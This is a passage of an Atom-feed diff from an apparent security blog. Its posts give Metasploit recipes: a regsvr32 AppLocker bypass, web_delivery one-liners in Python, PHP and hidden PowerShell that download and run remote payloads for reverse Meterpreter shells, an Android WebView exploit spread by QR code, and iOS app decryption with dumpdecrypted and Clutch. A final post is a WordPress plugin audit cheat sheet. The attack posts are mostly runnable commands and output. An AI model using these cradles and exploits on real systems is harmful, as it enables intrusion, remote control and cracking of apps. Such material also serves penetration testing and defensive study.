class="line"></span><br><span class="line">  Id  Type                   Information                                  Connection</span><br><span class="line">  --  ----                   -----------                                  ----------</span><br><span class="line">  1   meterpreter x86/win32  ADMINISTRATOR\Administrator @ ADMINISTRATOR  192.168.0.100:2333 -&gt; 192.168.0.100:63991 (10.211.55.3)</span><br><span class="line"></span><br><span class="line">msf exploit(web_delivery) &gt; sessions -i 1</span><br></pre></td></tr></table></figure>
+<hr>
+<p>###0x01 Metasploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/misc/regsvr32_applocker_bypass_server</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set LHOST 192.168.0.100</span><br><span class="line">LHOST =&gt; 192.168.0.100</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; set SRVPORT 8282</span><br><span class="line">SRVPORT =&gt; 8282</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.100:4444</span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8282/zS8L0xcR7U0</span><br><span class="line">[*] Local IP: http://192.168.0.100:8282/zS8L0xcR7U0</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.0.100:8282/zS8L0xcR7U0.sct scrobj.dll</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Handling request for the .sct file from 192.168.0.100</span><br><span class="line">[*] 192.168.0.100    regsvr32_applocker_bypass_server - Delivering payload to 192.168.0.100</span><br><span class="line">[*] Sending stage (983599 bytes) to 192.168.0.100</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 192.168.0.100:61502) at 2016-10-19 00:51:16 +0800</span><br><span class="line"></span><br><span class="line">msf exploit(regsvr32_applocker_bypass_server) &gt; sessions -i 1</span><br></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;###0x01 Metasploit&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line
+    
+    </summary>
+    
+    
+      <category term="Metasploit" scheme="http://blog.safebuff.com/tags/Metasploit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Web_Delivery with Metasploit</title>
+    <link href="http://blog.safebuff.com/2016/10/14/Web-Delivery-with-Metasploit/"/>
+    <id>http://blog.safebuff.com/2016/10/14/Web-Delivery-with-Metasploit/</id>
+    <published>2016-10-14T04:13:27.000Z</published>
+    <updated>2016-10-14T05:15:54.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Python"><a href="#0x01-Python" class="headerlink" title="0x01 Python"></a>0x01 Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">msf exploit(web_delivery) &gt; set target 0</span><br><span class="line">target =&gt; 0</span><br><span class="line">msf exploit(web_delivery) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/c2pZ0n9EZ</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/c2pZ0n9EZ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">python -c &quot;import urllib2; r = urllib2.urlopen(&apos;http://111.111.111.111:8080/c2pZ0n9EZ&apos;); exec(r.read());&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-PHP"><a href="#0x01-PHP" class="headerlink" title="0x01 PHP"></a>0x01 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 1</span><br><span class="line">target =&gt; 1</span><br><span class="line">msf &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 111.111.111.111:8081</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1G1wlPGJjES4k3</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/1G1wlPGJjES4k3</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://111.111.111.111:8080/1G1wlPGJjES4k3&apos;));&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Window-PowerShell"><a href="#0x03-Window-PowerShell" class="headerlink" title="0x03 Window PowerShell"></a>0x03 Window PowerShell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 111.111.111.111:2333</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/5Yk82s</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/5Yk82s</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $D=new-object net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $D.downloadstring(&apos;http://111.111.111.111:8080/5Yk82s&apos;);</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Python&quot;&gt;&lt;a href=&quot;#0x01-Python&quot; class=&quot;headerlink&quot; title=&quot;0x01 Python&quot;&gt;&lt;/a&gt;0x01 Python&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tabl
+    
+    </summary>
+    
+    
+      <category term="Metasploit" scheme="http://blog.safebuff.com/tags/Metasploit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Disable ASLR on iOS applications</title>
+    <link href="http://blog.safebuff.com/2016/10/11/Disable-ASLR-on-iOS-applications/"/>
+    <id>http://blog.safebuff.com/2016/10/11/Disable-ASLR-on-iOS-applications/</id>
+    <published>2016-10-11T09:42:01.000Z</published>
+    <updated>2016-10-15T14:14:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# cd /var/mobile/Applications/&lt;UUID&gt;/ApplicationBinary.app/</span><br><span class="line">iPhone5S:~ root# ~/removePIE ApplicationBinary</span><br><span class="line"></span><br><span class="line">M1IPhone (architecture armv7):</span><br><span class="line">Mach header</span><br><span class="line">      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags</span><br><span class="line">   MH_MAGIC     ARM         V7  0x00     EXECUTE    57       5788   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE</span><br><span class="line">M1IPhone (architecture arm64):</span><br><span class="line">Mach header</span><br><span class="line">      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags</span><br><span class="line">MH_MAGIC_64   ARM64        ALL  0x00     EXECUTE    57       6408   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
+    
+    </summary>
+    
+    
+      <category term="iOS" scheme="http://blog.safebuff.com/tags/iOS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>IOS ipa unpack via dumpdecrypted and Clutch</title>
+    <link href="http://blog.safebuff.com/2016/10/09/IOS-ipa-unpack-via-dumpdecrypted-and-Clutch/"/>
+    <id>http://blog.safebuff.com/2016/10/09/IOS-ipa-unpack-via-dumpdecrypted-and-Clutch/</id>
+    <published>2016-10-09T08:10:05.000Z</published>
+    <updated>2016-10-09T09:26:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Install-dumpdecrypted-Clutch-ifunbox"><a href="#0x01-Install-dumpdecrypted-Clutch-ifunbox" class="headerlink" title="0x01 Install dumpdecrypted Clutch ifunbox"></a>0x01 Install dumpdecrypted Clutch ifunbox</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/stefanesser/dumpdecrypted &amp;&amp; cd dumpdecrypted &amp;&amp; make &amp;&amp; ls</span><br><span class="line">Makefile            dumpdecrypted.c     dumpdecrypted.o</span><br><span class="line">README              dumpdecrypted.dylib</span><br></pre></td></tr></table></figure>
+<p>download <a href="https://github.com/KJCracks/Clutch/releases" target="_blank" rel="external">Cluth</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; scp Cluth root@10.0.250.10:/usr/bin/Clutch</span><br></pre></td></tr></table></figure></p>
+<p>Via <a href="http://www.i-funbox.com/en_download.html" target="_blank" rel="external">ifunbox</a> backup ipa</p>
+<h3 id="0x02-dumpdecrypted-unpack"><a href="#0x02-dumpdecrypted-unpack" class="headerlink" title="0x02 dumpdecrypted unpack"></a>0x02 dumpdecrypted unpack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ ps -e | grep var</span><br><span class="line">iPhone5S:~ cycript -p pid</span><br><span class="line"># [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]</span><br><span class="line">#&quot;file:///var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/Documents&quot;</span><br><span class="line">&gt; scp dumpdecrypted.dylib root@10.0.250.10:/var/mobile/Applications/F2842AA9-F</span><br><span class="line">082-4EA1-8FAD-97BBAAA84D8F/Documents/dumpdecrypted.dylib</span><br><span class="line">iPhone5S:~ /var/mobile/Applications/F2842AA9-F</span><br><span class="line">082-4EA1-8FAD-97BBAAA84D8F/Documents/ root# DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/M1IPhone.app/M1IPhone</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">objc[64669]: Class LocalAccount is implemented in both /System/Library/PrivateFrameworks/Message.framework/Message and /var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/M1IPhone.app/M1IPhone. One of the two will be used. Which one is undefined.</span><br><span class="line">mach-o decryption dumper</span><br><span class="line"></span><br><span class="line">DISCLAIMER: This tool is only meant for security research purposes, not for application crackers.</span><br><span class="line"></span><br><span class="line">[+] detected 64bit ARM binary in memory.</span><br><span class="line">[+] offset to cryptid found: @0x100014c08(from 0x100014000) = c08</span><br><span class="line">[+] Found encrypted data at address 00004000 of length 8798208 bytes - type 1.</span><br><span class="line">[+] Opening /private/var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/M1IPhone.app/M1IPhone for reading.</span><br><span class="line">[+] Reading header</span><br><span class="line">[+] Detecting header type</span><br><span class="line">[+] Executable is a FAT image - searching for right architecture</span><br><span class="line">[+] Correct arch is at offset 10600448 in the file</span><br><span class="line">[+] Opening M1IPhone.decrypted for writing.</span><br><span class="line">[+] Copying the not encrypted start of the file</span><br><span class="line">[+] Dumping the decrypted data into the file</span><br><span class="line">[+] Copying the not encrypted remainder of the file</span><br><span class="line">[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a1cc08</span><br><span class="line">[+] Closing original file</span><br><span class="line">[+] Closing dump file</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:/var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/Documents root# ls</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File/                       httpCache/                                       syssetting.sqlite-shm</span><br><span class="line">M1IPhone.decrypted          seeyondb.db                                      syssetting.sqlite-wal</span><br><span class="line">MobileWebsite.plist         serverID864d0587fe654e5298adf39cc1c3ad19.sqlite</span><br><span class="line">dumpdecrypted.dylib*  syssetting.sqlite</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; scp root@10.0.250.19:/var/root/M1Iphone.decrypted ./</span><br><span class="line">&gt; class-dump -H M1Iphone.decrypted -o head</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ABNewPersonViewControllerDelegate-Protocol.h                      SyGetMEdocListRequest.h</span><br><span class="line">ABPeoplePickerNavigationControllerDelegate-Protocol.h             SyGetMEdocListResponse.h</span><br><span class="line">AJOKeyPath.h                                                      SyGetMFeedbackListBiz.h</span><br><span class="line">AMCArrayMutableProtocol-Protocol.h                                SyGetMFeedbackListBizParam.h</span><br><span class="line">AMCArrayProtocol-Protocol.h                                       SyGetMFeedbackListRequest.h</span><br><span class="line">AMCHashMutableProtocol-Protocol.h                                 SyGetMFeedbackListResponse.h</span><br><span class="line">AMCHashProtocol-Protocol.h                                        SyGetMMeetingCountRequest.h</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Clutch-unpack"><a href="#0x03-Clutch-unpack" class="headerlink" title="0x03 Clutch unpack"></a>0x03 Clutch unpack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# Clutch -i</span><br><span class="line"></span><br><span class="line">Installed apps:</span><br><span class="line">1:   Uber &lt;com.ubercab.UberClient&gt;</span><br><span class="line">2:   QQ &lt;com.tencent.mqq&gt;</span><br><span class="line">3:   微信 &lt;com.tencent.xin&gt;</span><br><span class="line"></span><br><span class="line">iPhone5S:~ root# Clutch -d 1</span><br><span class="line"></span><br><span class="line">Zipping UberClient.app</span><br><span class="line">Swapping architectures..</span><br><span class="line">ASLR slide: 0x8f000</span><br><span class="line">Dumping &lt;UberClient&gt; (armv7)</span><br><span class="line">Patched cryptid (32bit segment)</span><br><span class="line">Writing new checksum</span><br><span class="line">ASLR slide: 0x1000fc000</span><br><span class="line">Dumping &lt;XueBa&gt; (arm64)</span><br><span class="line">Patched cryptid (64bit segment)</span><br><span class="line">Writing new checksum</span><br><span class="line">DONE: /private/var/mobile/Documents/Dumped/com.UberClient-iOS7.0-(Clutch-2.0.4).ipa</span><br><span class="line">Finished dumping com.wenba.bangbang in 19.6 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-weak-classdump-unpack"><a href="#0x04-weak-classdump-unpack" class="headerlink" title="0x04 weak_classdump unpack"></a>0x04 weak_classdump unpack</h3><p><strong>download</strong> <a href="https://github.com/limneos/weak_classdump" target="_blank" rel="external">weak_classdump</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# cycript -p Skype weak_classdump.cy; cycript -p Skype</span><br><span class="line"></span><br><span class="line">&apos;Added weak_classdump to &quot;Skype&quot; (1685)&apos;</span><br><span class="line"></span><br><span class="line">#cy weak_classdump_bundle([NSBundle mainBundle],&quot;/tmp/MobilePhone&quot;)</span><br></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Install-dumpdecrypted-Clutch-ifunbox&quot;&gt;&lt;a href=&quot;#0x01-Install-dumpdecrypted-Clutch-ifunbox&quot; class=&quot;headerlink&quot; title=&quot;0x01 Insta
+    
+    </summary>
+    
+    
+      <category term="IOS" scheme="http://blog.safebuff.com/tags/IOS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Attacks on Android WebViews</title>
+    <link href="http://blog.safebuff.com/2016/10/01/Attacks-on-Android-WebViews/"/>
+    <id>http://blog.safebuff.com/2016/10/01/Attacks-on-Android-WebViews/</id>
+    <published>2016-09-30T17:12:36.000Z</published>
+    <updated>2016-10-01T07:18:59.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/android/browser/webview_addjavascriptinterface</span><br><span class="line">&gt; set LHOST 192.168.0.110</span><br><span class="line">&gt; exploit</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/xl7dev</span><br><span class="line">[*] Local IP: http://192.168.0.110:8080/xl7dev</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-QR-Code-Attack"><a href="#0x02-QR-Code-Attack" class="headerlink" title="0x02 QR Code Attack"></a>0x02 QR Code Attack</h3><blockquote>
+<p>qr “<a href="http://192.168.0.110:8080/xl7dev" target="_blank" rel="external">http://192.168.0.110:8080/xl7dev</a>“</p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Metasploit&quot;&gt;&lt;a href=&quot;#0x01-Metasploit&quot; class=&quot;headerlink&quot; title=&quot;0x01 Metasploit&quot;&gt;&lt;/a&gt;0x01 Metasploit&lt;/h3&gt;&lt;figure class=&quot;highli
+    
+    </summary>
+    
+    
+      <category term="Android" scheme="http://blog.safebuff.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WordPress Plugin Security Testing Cheat Sheet</title>
+    <link href="http://blog.safebuff.com/2016/09/28/WordPress-Plugin-Security-Testing-Cheat-Sheet/"/>
+    <id>http://blog.safebuff.com/2016/09/28/WordPress-Plugin-Security-Testing-Cheat-Sheet/</id>
+    <published>2016-09-28T04:27:46.000Z</published>
+    <updated>2016-09-28T04:41:39.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h3><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_REQUEST</span><br><span class="line">$_SERVER[&apos;REQUEST_URI&apos;]</span><br><span class="line">$_SERVER[&apos;PHP_SELF&apos;]</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>
+<h4 id="Unsafe-API-functions"><a href="#Unsafe-API-functions" class="headerlink" title="Unsafe API functions"></a>Unsafe API functions</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_query_arg()</span><br><span class="line">remove_query_arg()</span><br></pre></td></tr></table></figure>
+<p>Reference: <a href="https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html" target="_blank" rel="external">https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html</a></p>
+<h4 id="Disallow-unfilterd-html"><a href="#Disallow-unfilterd-html" class="headerlink" title="Disallow unfilterd html"></a>Disallow unfilterd html</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define( &apos;DISALLOW_UNFILTERED_HTML&apos;, true );</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-SQL-Injection"><a href="#0x02-SQL-Injection" class="headerlink" title="0x02 SQL Injection"></a>0x02 SQL Injection</h3><h4 id="Unsafe-API-methods-require-sanitising-escaping"><a href="#Unsafe-API-methods-require-sanitising-escaping" class="headerlink" title="Unsafe API methods (require sanitising/escaping)"></a>Unsafe API methods (require sanitising/escaping)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wpdb-&gt;query()</span><br><span class="line">$wpdb-&gt;get_var()</span><br><span class="line">$wpdb-&gt;get_row()</span><br><span class="line">$wpdb-&gt;get_col()</span><br><span class="line">$wpdb-&gt;get_results()</span><br><span class="line">$wpdb-&gt;replace()</span><br></pre></td></tr></table></figure>
+<h4 id="Safe-API-methods-according-to-WordPress"><a href="#Safe-API-methods-according-to-WordPress" class="headerlink" title="Safe API methods (according to WordPress)"></a>Safe API methods (according to WordPress)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wpdb-&gt;insert()</span><br><span class="line">$wpdb-&gt;update()</span><br><span class="line">$wpdb-&gt;delete()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Safe code</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sql = $wpdb-&gt;prepare( &apos;query&apos; , value_parameter[, value_parameter ... ] ); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>####Unsafe escaping (‘securing’) API methods</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">esc_sql()</span><br><span class="line">escape()</span><br><span class="line">esc_like()</span><br><span class="line">like_escape()</span><br></pre></td></tr></table></figure>
+<h4 id="Displaying-hiding-SQL-errors"><a href="#Displaying-hiding-SQL-errors" class="headerlink" title="Displaying/hiding SQL errors"></a>Displaying/hiding SQL errors</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $wpdb-&gt;show_errors(); ?&gt; </span><br><span class="line">&lt;?php $wpdb-&gt;hide_errors(); ?&gt; </span><br><span class="line">&lt;?php $wpdb-&gt;print_error(); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-File-Inclusion"><a href="#0x03-File-Inclusion" class="headerlink" title="0x03 File Inclusion"></a>0x03 File Inclusion</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-PHP-Object-Injection"><a href="#0x04-PHP-Object-Injection" class="headerlink" title="0x04 PHP Object Injection"></a>0x04 PHP Object Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize()</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-Authorisation"><a href="#0x05-Authorisation" class="headerlink" title="0x05 Authorisation"></a>0x05 Authorisation</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_admin()</span><br><span class="line">is_user_admin()</span><br><span class="line">current_user_can()</span><br></pre></td></tr></table></figure>
+<h3 id="0x06-Open-Redirect"><a href="#0x06-Open-Redirect" class="headerlink" title="0x06 Open Redirect"></a>0x06 Open Redirect</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp_redirect()</span><br></pre></td></tr></table></figure>
